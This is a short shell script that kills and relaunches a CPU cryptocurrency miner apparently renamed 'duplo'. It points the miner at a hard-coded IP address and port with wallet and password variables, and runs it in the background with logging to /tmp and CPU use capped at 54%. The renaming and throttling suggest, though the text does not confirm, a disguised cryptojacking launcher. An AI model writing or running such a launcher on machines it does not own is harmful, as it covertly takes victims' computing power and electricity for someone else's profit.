pkill duplo
duplo -o 95.216.207.56:47298 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/duplo/duplo.log --donate-level=1 --print-time=40 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=54 --av=1 --variant -1
echo -e 'ALL WORKS! tail -f /tmp/duplo/duplo.log'
